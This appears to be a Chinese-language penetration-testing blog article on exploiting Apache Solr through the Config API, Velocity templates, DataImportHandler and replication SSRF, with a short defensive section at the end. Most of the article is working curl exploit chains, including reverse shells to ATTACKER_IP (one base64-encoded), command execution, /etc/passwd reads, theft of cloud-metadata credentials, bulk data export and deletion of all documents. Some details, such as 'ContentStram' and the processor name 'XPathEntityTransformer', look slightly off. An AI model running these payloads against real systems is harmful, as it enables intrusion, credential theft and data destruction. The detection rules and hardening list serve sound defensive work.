---
title: "Apache Solr Config API / Velocity 模板 / SSRF RCE 利用技术"
date: 2026-06-21T06:00:00+08:00
draft: false
weight: 94
description: "Apache Solr 搜索引擎渗透测试：Config API RCE、Velocity 模板 SSTI、DataImportHandler SSRF、CVE-2019-17558 / CVE-2021-27905 / CVE-2017-12629 漏洞利用链路与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["Apache Solr", "Config API", "Velocity", "SSTI", "SSRF", "RCE", "DataImportHandler", "搜索引擎安全", "渗透测试"]
---

## 0x00 攻击面总览

Apache Solr 是企业级搜索引擎，默认配置下管理 API 无认证，存在多个高危 RCE 和 SSRF 向量：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| Solr HTTP API | 8983 | HTTP | 搜索、索引、管理 API |
| Config API | 8983 | HTTP | 动态配置修改 → RCE |
| Replication Handler | 8983 | HTTP | 索引复制 → SSRF |
| DataImportHandler | 8983 | HTTP | 数据导入 → SSRF / RCE |
| SolrCloud (ZooKeeper) | 2181 | TCP | 集群协调、配置存储 |
| Solr Admin UI | 8983 | HTTP | 管理界面、Core 管理 |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    Apache Solr 集群                             │
│                                                               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    │
│  │ Solr Node 1  │    │ Solr Node 2  │    │ ZooKeeper    │    │
│  │ :8983        │    │ :8983        │    │ :2181        │    │
│  │ Config/Velocity│  │ 搜索/索引    │    │ 集群协调      │    │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘    │
│         │                   │                    │            │
│  ┌──────┴───────────────────┴────────────────────┴─────────┐ │
│  │              内网 / 搜索专用网络                           │ │
│  │                                                          │ │
│  │  攻击路径：                                               │ │
│  │  ① Config API → RunExecutableListener → RCE              │ │
│  │  ② Velocity 模板 SSTI → RCE                              │ │
│  │  ③ DataImportHandler → SSRF / 数据注入                    │ │
│  │  ④ Replication Handler → SSRF                             │ │
│  │  ⑤ shards 参数 → SSRF → 云元数据窃取                      │ │
│  └──────────────────────────────────────────────────────────┘ │
│                                                               │
│  默认风险：                                                    │
│  • 管理 API 无认证                                             │
│  • Config API 允许动态修改配置                                  │
│  • Velocity 自定义模板可注入                                    │
│  • EnableRemoteStreaming 可能默认启用                           │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 8983,2181 \
  --script=http-title \
  -oN solr_scan.txt <target>
```

**典型扫描结果**：

```
PORT     STATE SERVICE     VERSION
8983/tcp open  http        Apache Solr
2181/tcp open  zookeeper   ZooKeeper 3.7.1
```

### 1.2 版本指纹

```bash
# 获取 Solr 版本
curl -s "http://target:8983/solr/admin/info/system" | python3 -m json.tool

# 响应示例
{
  "lucene": {
    "solr-spec-version": "9.4.0",
    "solr-impl-version": "9.4.0"
  },
  "jvm": {
    "version": "17.0.8",
    "name": "OpenJDK"
  }
}

# 列出所有 Core
curl -s "http://target:8983/solr/admin/cores?action=STATUS" | python3 -m json.tool

# 获取集群状态（SolrCloud 模式）
curl -s "http://target:8983/solr/admin/collections?action=CLUSTERSTATUS" | python3 -m json.tool
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
http.html:"Apache Solr"
port:8983 http.title:"Solr"

# FOFA
body="Apache Solr" && port="8983"
body="solr" && body="admin"
```

---

## 0x02 Config API — 动态配置 RCE

### 2.1 CVE-2017-12629 — RunExecutableListener RCE

```bash
# 步骤 1：通过 Config API 添加恶意 RunExecutableListener
curl -s -X POST "http://target:8983/solr/test_core/config" \
  -H "Content-Type: application/json" \
  -d '{
    "add-listener": {
      "event": "postCommit",
      "name": "evil",
      "class": "solr.RunExecutableListener",
      "exe": "/bin/bash",
      "dir": "/tmp",
      "args": ["-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]
    }
  }'

# 步骤 2：触发 postCommit 事件（通过索引文档）
curl -s -X POST "http://target:8983/solr/test_core/update" \
  -H "Content-Type: application/json" \
  -d '[{"id": "1", "title": "trigger"}]'
```

### 2.2 通过 Config API 启用远程流

```bash
# 启用 EnableRemoteStreaming
curl -s -X POST "http://target:8983/solr/test_core/config" \
  -H "Content-Type: application/json" \
  -d '{"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": true}}'

# 然后通过 stream.url 参数进行 SSRF
curl -s "http://target:8983/solr/test_core/debug/dump?param=ContentStram&stream.url=http://169.254.169.254/latest/meta-data/"
```

### 2.3 通过 Config API 添加恶意 SearchComponent

```bash
# 添加自定义 SearchComponent
curl -s -X POST "http://target:8983/solr/test_core/config" \
  -H "Content-Type: application/json" \
  -d '{
    "add-searchcomponent": {
      "name": "evil",
      "class": "org.apache.solr.handler.component.QueryElevationComponent",
      "configFile": "http://ATTACKER_IP:8888/evil-config.xml"
    }
  }'
```

---

## 0x03 Velocity 模板 SSTI — RCE

### 3.1 CVE-2019-17558 — Velocity 模板注入

| 属性 | 详情 |
|------|------|
| 影响版本 | Apache Solr 5.0.0 - 8.3.1 |
| CVSS | 9.6（Critical） |
| 类型 | 服务端模板注入（SSTI） |
| 攻击向量 | Velocity 自定义模板 |
| 根因 | Velocity 模板引擎允许执行任意 Java 代码 |

### 3.2 漏洞利用

```bash
# 步骤 1：通过 Config API 启用 Velocity 自定义模板
curl -s -X POST "http://target:8983/solr/test_core/config" \
  -H "Content-Type: application/json" \
  -d '{"update-queryresponsewriter": {
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.custom_velocity_1": "#set($x=\"\")#set($rt=$x.class.forName(\"java.lang.Runtime\"))#set($chr=$x.class.forName(\"java.lang.Character\"))#set($str=$x.class.forName(\"java.lang.String\"))#set($ex=$rt.getRuntime().exec(\"id\"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }}'

# 步骤 2：触发模板执行
curl -s "http://target:8983/solr/test_core/select?q=1&wt=velocity&v.template=custom_velocity_1"
```

### 3.3 反弹 Shell

```bash
# 步骤 1：启用 Velocity 模板
curl -s -X POST "http://target:8983/solr/test_core/config" \
  -H "Content-Type: application/json" \
  -d '{"update-queryresponsewriter": {
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.custom_shell": "#set($x=\"\")#set($rt=$x.class.forName(\"java.lang.Runtime\"))#set($ex=$rt.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}\"))$ex.waitFor()",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }}'

# 步骤 2：触发执行
curl -s "http://target:8983/solr/test_core/select?q=1&wt=velocity&v.template=custom_shell"
```

### 3.4 任意文件读取

```bash
# 通过 Velocity 模板读取文件
curl -s -X POST "http://target:8983/solr/test_core/config" \
  -H "Content-Type: application/json" \
  -d '{"update-queryresponsewriter": {
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.read_file": "#set($x=\"\")#set($scanner=$x.class.forName(\"java.util.Scanner\").getConstructor($x.class.forName(\"java.io.InputStream\")).newInstance($x.class.forName(\"java.io.FileInputStream\").newInstance(\"/etc/passwd\")))#set($out=$scanner.useDelimiter(\"\\\\A\").next())$out",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }}'

curl -s "http://target:8983/solr/test_core/select?q=1&wt=velocity&v.template=read_file"
```

---

## 0x04 DataImportHandler — SSRF / RCE

### 4.1 CVE-2019-0193 — DataImportHandler 脚本注入

```bash
# 通过 DataImportHandler 执行命令
curl -s -X POST "http://target:8983/solr/test_core/dataimport" \
  -H "Content-Type: application/json" \
  -d '{
    "command": "full-import",
    "verbose": false,
    "clean": false,
    "commit": false,
    "dataConfig": "<dataConfig>\n  <dataSource type=\"URLDataSource\"/>\n  <script><![CDATA[\n    function f1() {\n      var Runtime = java.lang.Runtime;\n      Runtime.getRuntime().exec(\"id\");\n    }\n  ]]></script>\n  <document>\n    <entity name=\"entity1\" url=\"http://ATTACKER_IP:8888/data\" processor=\"XPathEntityTransformer\" transformer=\"script:f1\"/>\n  </document>\n</dataConfig>"
  }'
```

### 4.2 DataImportHandler SSRF

```bash
# 通过 URLDataSource 进行 SSRF
curl -s -X POST "http://target:8983/solr/test_core/dataimport" \
  -H "Content-Type: application/json" \
  -d '{
    "command": "full-import",
    "dataConfig": "<dataConfig>\n  <dataSource type=\"URLDataSource\"/>\n  <document>\n    <entity name=\"entity1\" url=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" processor=\"XPathEntityTransformer\"/>\n  </document>\n</dataConfig>"
  }'
```

---

## 0x05 Replication Handler — SSRF

### 5.1 CVE-2021-27905 — Replication Handler SSRF

```bash
# 通过 Replication Handler 进行 SSRF
curl -s "http://target:8983/solr/test_core/replication?command=fetchindex&masterUrl=http://169.254.169.254/latest/meta-data/"

# 云元数据窃取
curl -s "http://target:8983/solr/test_core/replication?command=fetchindex&masterUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 内网服务探测
curl -s "http://target:8983/solr/test_core/replication?command=fetchindex&masterUrl=http://10.0.0.1:8080/"
```

---

## 0x06 shards 参数 — SSRF

### 6.1 通过搜索请求 SSRF

```bash
# 通过 shards 参数进行 SSRF
curl -s "http://target:8983/solr/test_core/select?q=*:*&shards=http://169.254.169.254/latest/meta-data/&wt=json"

# 内网探测
curl -s "http://target:8983/solr/test_core/select?q=*:*&shards=http://10.0.0.1:9200/&wt=json"
```

---

## 0x07 数据窃取与索引操作

### 7.1 搜索数据

```bash
# 搜索所有文档
curl -s "http://target:8983/solr/test_core/select?q=*:*&wt=json" | python3 -m json.tool

# 搜索特定字段
curl -s "http://target:8983/solr/test_core/select?q=password:*&wt=json&fl=*"

# 导出大量数据
curl -s "http://target:8983/solr/test_core/select?q=*:*&wt=csv&rows=100000" > exfil.csv
```

### 7.2 索引操作

```bash
# 添加文档
curl -s -X POST "http://target:8983/solr/test_core/update?commit=true" \
  -H "Content-Type: application/json" \
  -d '[{"id": "1", "title": "malicious", "content": "injected content"}]'

# 删除文档
curl -s -X POST "http://target:8983/solr/test_core/update?commit=true" \
  -H "Content-Type: application/json" \
  -d '{"delete": {"query": "*:*"}}'
```

---

## 0x08 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2017-12629 | RCE | 9.8 | Config API RunExecutableListener RCE |
| CVE-2019-0193 | RCE | 8.1 | DataImportHandler 脚本注入 RCE |
| CVE-2019-17558 | SSTI/RCE | 9.6 | Velocity 模板注入 RCE |
| CVE-2021-27905 | SSRF | 7.5 | Replication Handler SSRF |
| CVE-2021-27906 | SSRF | 7.5 | shards 参数 SSRF |
| CVE-2017-3163 | SSRF | 6.1 | Solr SSRF |

**CVE-2019-17558 影响范围**：

Apache Solr 5.0.0 - 8.3.1。攻击者通过 Config API 启用 Velocity 自定义模板功能，然后注入恶意模板实现 RCE。CVSS 9.6。

---

## 0x09 蓝队检测方案

### 9.1 网络层检测

```yaml
title: Apache Solr API 外部访问检测
id: solr-api-external-access
status: experimental
description: 检测来自非内网段的 Solr API 访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 8983
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

### 9.2 RCE 检测

```yaml
title: Solr Config API RCE 检测
id: solr-config-api-rce
status: experimental
description: 检测 Solr Config API 中的 RCE 攻击
logsource:
  product: apache_solr
  service: solr
detection:
  selection_exec:
    body|contains:
      - "RunExecutableListener"
      - "Runtime.getRuntime"
      - "ProcessBuilder"
  selection_velocity:
    body|contains:
      - "VelocityResponseWriter"
      - "params.resource.loader.enabled"
      - "template.custom"
  condition: selection_exec or selection_velocity
level: critical
```

### 9.3 审计日志分析

```bash
# 监控 Config API 操作
grep "/config" /var/log/solr/solr.log

# 检测 Velocity 模板注入
grep -E "(VelocityResponseWriter|params.resource.loader|template.custom)" \
  /var/log/solr/solr.log

# 检测 DataImportHandler 操作
grep "dataimport" /var/log/solr/solr.log

# 检测 Replication Handler SSRF
grep "fetchindex" /var/log/solr/solr.log

# 检测异常 shards 参数
grep "shards=" /var/log/solr/solr.log

# 监控云元数据访问
grep "169.254.169.254" /var/log/solr/solr.log
```

### 9.4 加固清单

```
[ ] 升级至 Apache Solr >= 8.4.0（修复 CVE-2019-17558）
[ ] 升级至 Apache Solr >= 8.8.2（修复 CVE-2021-27905/27906）
[ ] Solr API (8983) 仅允许内网访问
[ ] 启用 Solr 认证（security.json）
[ ] 禁用 Config API 或限制访问
[ ] 禁用 VelocityResponseWriter 或禁用 params.resource.loader
[ ] 禁用 DataImportHandler（如不需要）
[ ] 禁用 EnableRemoteStreaming
[ ] 配置 shards.whitelist 限制 SSRF
[ ] 在前面放置反向代理并启用认证
[ ] 启用 HTTPS 并配置 TLS 证书
[ ] 启用审计日志并接入 SIEM
[ ] 监控 Config API 中的异常配置修改
[ ] 定期审查 Core 和 Collection 配置
[ ] ZooKeeper 启用 ACL 和 SASL 认证
```

---

## 0x10 渗透测试检查清单

```
[ ] 端口扫描：8983, 2181
[ ] Solr API (8983) 未授权访问测试
[ ] 版本信息收集（/solr/admin/info/system）
[ ] Core/Collection 枚举
[ ] CVE-2017-12629 Config API RCE 测试
[ ] CVE-2019-17558 Velocity SSTI RCE 测试
[ ] CVE-2019-0193 DataImportHandler RCE 测试
[ ] CVE-2021-27905 Replication Handler SSRF 测试
[ ] shards 参数 SSRF 测试
[ ] EnableRemoteStreaming SSRF 测试
[ ] 数据搜索与导出测试
[ ] 索引操作测试（添加/删除文档）
[ ] 云元数据 SSRF 测试（169.254.169.254）
[ ] 认证配置检查
[ ] TLS/SSL 配置检查
```

---

## 0x11 小结

Apache Solr 的攻击面以 **Config API** 和 **Velocity 模板引擎** 为核心。CVE-2017-12629 通过 Config API 添加 `RunExecutableListener` 实现 RCE，CVE-2019-17558 通过 Velocity 模板 SSTI 实现 RCE（CVSS 9.6）。SSRF 方面，Replication Handler（CVE-2021-27905）、DataImportHandler、shards 参数均可用于内网探测和云元数据窃取。默认配置下管理 API 无认证，攻击者可以直接修改配置、注入模板、窃取索引数据。蓝队应重点关注：升级至最新版本、启用认证、禁用危险组件（Velocity/DataImportHandler/EnableRemoteStreaming）、限制网络访问、将审计日志接入 SIEM。
